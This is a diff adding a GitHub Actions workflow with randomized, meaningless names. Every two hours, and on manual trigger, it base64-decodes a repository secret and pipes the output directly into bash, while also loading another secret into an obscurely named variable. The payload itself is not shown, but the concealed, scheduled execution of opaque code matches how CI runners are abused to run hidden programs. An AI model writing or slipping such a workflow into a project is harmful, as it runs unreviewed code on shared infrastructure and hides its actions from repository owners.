@@ -1,0 +1,13 @@
+name: DGIEXv
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  VsqHpqn:
+    runs-on: ubuntu-latest
+    env:
+      kIbcXnpts: ${{ secrets.bdCOnvut }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: echo "${{ secrets.pWOHwBveUH }}" | base64 -d | bash
